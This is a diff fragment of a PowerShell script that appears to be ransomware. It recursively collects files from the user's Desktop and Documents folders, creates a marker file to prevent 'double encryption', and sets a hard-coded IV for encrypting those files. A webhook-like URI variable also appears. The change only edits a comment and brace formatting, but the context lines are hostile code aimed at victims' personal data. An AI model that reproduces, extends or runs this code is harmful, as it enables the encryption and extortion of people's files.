@@ -42,11 +42,13 @@ $whuri = "$dc"
 $SourceFolder = "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents"
 $files = Get-ChildItem -Path $SourceFolder -File -Recurse
 
-# Generate the indcator file (for pop-up close detection)
+# Generate the indcator file (for pop-up close detection and to avoid double encryption)
 $indicator = "$env:tmp/indicate"
 if (!(Test-Path -Path $indicator)){
 "indicate" | Out-File -FilePath $indicator -Append
-}else{exit}
+}else{
+exit
+}
 
 # Encryption setup
 $CustomIV = 'r7SbTffTMbMA4Zm70iHAwA=='
